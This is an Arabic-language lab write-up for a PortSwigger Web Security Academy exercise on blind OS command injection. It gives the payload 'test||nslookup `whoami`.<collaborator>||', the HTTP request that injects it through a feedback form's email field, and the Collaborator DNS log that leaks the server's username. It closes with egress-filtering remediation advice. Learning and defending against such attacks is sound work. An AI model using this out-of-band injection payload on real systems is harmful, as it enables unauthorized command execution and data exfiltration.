# [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

## **`الهدف`**
قم بتنفيذ الأمر `whoami` واستخرج الناتج عبر `DNS query` إلى `Burp Collaborator`، ثم قم بتقديم اسم المستخدم الحالي كـ `Solution`.
## **`خطوات الحل`**
**`ملاحظة هامة:`** لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

سنقوم بالضغط على `Submit feedback` ثم نقوم بوضع أى بيانات عشوائية وإرسال الطلب، ثم تحويله من داخل `HTTP history` إلى `Repeater` 

ثم سنقوم بتعديل قيمة حقل `email` من داخل `Inspector` كالتالي مع وضع رابط الـ `Subdomain` الخاص بـ `Burp Collaborator` في موضعه
```Shell
test||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

ثم سنقوم بإرسال الطلب
```http
POST /feedback/submit HTTP/2
Host: 0ad2002203453625805e858900fe00be.web-security-academy.net
Cookie: session=mjjHIlEmK0Ve1pfb9RCFg3iVU4NMsmsi

csrf=rdTfzgY8rImsP8JrX5hzzXMyLYlTCbIx&name=test&email=test%7c%7cnslookup%20%60whoami%60.jnavcczfl0d7z20tg8uygrrpsgycm2ar.oastify.com%7c%7c&subject=test&message=test
```

وبعد ذلك سنقوم بالتوجه إلى `Burp Collaborator` ونضغط على `Poll now` وسنجد تفاعل `DNS` قد تم تفعيله من سيرفر الواجهة الخلفية وسنجد أن المستخدم ظاهرًا ضمن الـ  `DNS subdomain` 
```
The Collaborator server received a DNS lookup of type A for the domain name peter-hmDHAI.jnavcczfl0d7z20tg8uygrrpsgycm2ar.oastify.com.  
  
The lookup was received from IP address 99.80.88.36:8965 at 2026-Nov-12 16:04:06.552 UTC.
```

لذلك سنقوم بنسخ اسم المستخدم `peter-hmDHAI` ونعود إلى المتصفح ثم نضغط على `Submit solution` ونضعه في الحقل المناسب ونضغط على `OK` لننتهي من حل اللاب.

`ملاحظة:` الدابل بايب `(||)` تعنى `OR` أى عند فشل الأمر الأول قم بتنفيذ التالي، عندما قمنا بوضع بريد غير صالح بصيغة خاطئة فشل الإرسال فتم تنفيذ أمر `Ping` أما الـ `||` الأخير فهي للفصل بين أمر `Ping` وباقي سطر الأوامر لكي لا يحدث تداخل.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Blind OS command injection with time delays](./Blind-OS-command-injection-with-time-delays.md)

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind OS` أو تسريب البيانات `Out-of-band Data Exfiltration`.
